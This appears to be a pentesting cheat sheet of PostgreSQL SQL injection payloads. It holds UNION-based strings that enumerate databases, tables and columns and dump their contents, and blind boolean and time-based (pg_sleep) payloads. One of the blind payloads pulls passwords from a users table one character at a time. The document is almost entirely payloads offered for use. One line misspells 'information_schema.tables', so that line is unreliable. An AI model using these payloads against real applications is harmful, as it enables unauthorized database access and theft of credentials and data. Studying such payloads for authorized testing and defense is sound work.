# PostgreSQL injection

## UNION Based

### Step 1: Show databases

```sql
# Show databases:
' ## To see the names of all the databases:
' UNION SELECT datname, NULL FROM pg_database-- -
' ## It shows the current DB:
' UNION SELECT current_database(), NULL-- -
```

### Step 2: Tables and columns

```sql
## To see all the tables of all the databases (indicates me to which DB belongs that table):

# Tables:
' ## Show all tables in the current database:
' UNION SELECT table_name, NULL,NULL FROM information_schema.tables-- -
' ## Show all tables of a specific database:
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables,pg_database WHERE datname='<DB NAME>'-- -
' ## We would have to change in the following order: LIMIT 1 offset 0, LIMIT 1 offset 1, LIMIT 1 offset 2, ...
' UNION SELECT table_name,NULL,NULL FROM information_schema.table LIMIT 1 offset 0-- -

# Columns:
' UNION SELECT column_name, NULL,NULL FROM information_schema.columns WHERE table_name='<TABLE NAME>'-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='<TABLE NAME>'LIMIT 1 offset 0-- -
```

### Step 3: Dump info

```sql
' UNION SELECT <COLUMN NAME>,NULL,NULL,NULL,NULL FROM <TABLE NAME>-- -
' UNION SELECT concat(<COLUMN NAME>,':',<COLUMN NAME>) FROM <TABLE NAME>,pg_database WHERE datname='<DB NAME>' LIMIT 1 offset 0-- -
' UNION SELECT NULL,<COLUMN NAME>||':'||<COLUMN NAME> FROM <TABLE NAME>,pg_database WHERE datname='<DB NAME>' LIMIT 1 offset 0-- -
```

## BLIND Based

```sql
' # All tables:
' AND (SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1 offset {j}),{i},1))='{character}'
' # Columns:
' AND (SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 offset {j}),{i},1))='{character}'
' # Dump info:
' AND (SELECT SUBSTRING((SELECT password FROM users LIMIT 1 offset {j}),{i},1))='{character}'

' # Other
'%3bSELECT CASE WHEN (SELECT SUBSTRING((SELECT datname from pg_database LIMIT 1 offset {j}),{i},1)='{character}') THEN pg_sleep(10) ELSE pg_sleep(0) END-- -
```
